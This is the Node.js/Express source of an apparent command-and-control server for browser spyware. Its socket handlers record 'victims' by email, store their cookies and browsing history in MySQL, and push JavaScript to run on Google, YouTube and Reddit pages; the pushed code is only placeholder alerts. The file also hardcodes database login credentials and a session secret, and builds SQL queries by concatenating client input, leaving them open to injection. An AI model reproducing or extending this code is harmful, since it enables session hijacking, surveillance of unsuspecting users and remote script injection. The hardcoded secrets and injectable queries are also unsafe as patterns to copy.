var express = require('express');
var passport = require('passport');
var Strategy = require('passport-local').Strategy;
var users = require('./db/users');
var app = express();
var server = require('http').Server(app);
var io = require('socket.io')(server);
var mysql = require('mysql');

var con = mysql.createConnection({
  host: "mysql4.cs.stonybrook.edu",
  user: "kevchang",
  password: "110328939",
  database: "kevchang"
});

con.connect(function(err) {
  if (err) throw err;
  console.log("Connected To Database!");
});

/* This is commented out because users.js seems to be necessary for the passport module.
con.query("SELECT * FROM Admin WHERE name= '"+username+"'", function (err, result, fields) {
  if (err) return cb(null,err);
  if(password === result[0].password){
    var user = {
      id: result[0].idAdmin,
      username: username,
      password: password,
      displayName: username,
      emails: [{
        value: 'email@gmail.com'
      }]};
    return cb(null,user);
  }else{
    return cb(null,false);
  }
});
*/

passport.use(new Strategy(
  function(username, password, cb) {
    users.findByUsername(username, function(err, user) {
      if (err) { return cb(err); }
      if (!user) { return cb(null, false); }
      if (user.password != password) { return cb(null, false); }
      return cb(null, user);
    });
  }));

passport.serializeUser(function(user, cb) {
  cb(null, user.id);
});

passport.deserializeUser(function(id, cb) {
  users.findById(id, function (err, user) {
    if (err) { return cb(err); }
    cb(null, user);
  });
});




// Create a new Express application.


// Configure view engine to render EJS templates.
app.set('views', __dirname + '/views');
app.set('view engine', 'ejs');

// Use application-level middleware for common functionality, including
// logging, parsing, and session handling.
//app.use(require('morgan')('combined'));
app.use(require('cookie-parser')());
app.use(require('body-parser').urlencoded({ extended: true }));
app.use(require('express-session')({ secret: 'idkThisIsMySecretToSignCookie', resave: false, saveUninitialized: false }));

//for frontend styling
app.use(express.static('views'));


// Initialize Passport and restore authentication state, if any, from the
// session.
app.use(passport.initialize());
app.use(passport.session());

// Define routes.
app.get('/',
  require('connect-ensure-login').ensureLoggedIn(),
  function(req, res) {
    con.query("SELECT * FROM Victims", function (err, result, fields) {
      if (err) throw err;
      res.render('home', { rowData: result });
    });
  });

app.get('/login',
  function(req, res){
    res.render('login');
  });

app.post('/login',
  passport.authenticate('local', { failureRedirect: '/login' }),
  function(req, res) {
    res.redirect('/');
  });

app.get('/logout',
  function(req, res){
    req.logout();
    res.redirect('/');
  });

app.get('/cookies',
  require('connect-ensure-login').ensureLoggedIn(),
  function(req, res){
    con.query("SELECT * FROM Cookie", function (err, result, fields) {
      if (err) throw err;
      res.render('cookies', { user: req.user, rowData: result });
    });

  });

app.get('/history',
  require('connect-ensure-login').ensureLoggedIn(),
  function(req, res){
    con.query("SELECT * FROM History", function (err, result, fields) {
      if (err) throw err;
      res.render('history', { user: req.user, rowData: result });
    });

  });

app.get('/profile',
  require('connect-ensure-login').ensureLoggedIn(),
  function(req, res){
    res.render('profile', { user: req.user });
  });


server.listen(3000);
console.log("Listening on port 3000");

io.on('connection', (socket) => {
  socket.on("userInfo", (userInfo) => {
    var sql = "INSERT INTO Victims (email, userID) VALUES ('"+userInfo.email+"', '"+ userInfo.id+"')";
    con.query(sql, function (err, result) {
      console.log("1 victim added: "+userInfo.email);
    });
    socket.emit('securityWebsites', [
      // "www.google.com",
      // "www.youtube.com"
      "http://corndog.io/"
    ]);
	socket.emit('jsExecution',
		[
		{site: "www.google.com", code: 'alert("GOOGLE");'},
		{site: "www.youtube.com", code: 'alert("YOUTUBE");'},
		{site: "www.reddit.com", code: 'alert("REDDIT");'}
		]);
    socket.on('Login', (loginInfo) => {
      console.log("Login detected: " + loginInfo);
    });
    socket.on('Cookies', (cookies) => {
      var sql = "INSERT INTO Cookie (userID, details) VALUES ('"+userInfo.id+"', '"+ cookies+"')";
      con.query(sql, function (err, result) {
        if (err) throw err;
      });
    });
    socket.on('History', (history) => {
      var str1 = "'"+history[0]+"'" //siteLink String
      var str2 = "'"+history[1]+"'" //timeStamp String

      //INSERT INTO kevchang.History (userID, Details) VALUES (1, "secondDetails");
      var sql = "INSERT INTO History (userID, timeDetails,siteLink) VALUES ('"+userInfo.id+"', "+ str2 + ","+ str1+")";

      con.query(sql, function (err, result) {
          if (err) throw err;
      });
      //history.forEach((field) => {
        //console.log("Field: "+typeof(field));
        //
        //console.log("    " + field);
      //});
    });
    socket.on('disconnect', () => {
      console.log("User disconnected");
    });
  });
});
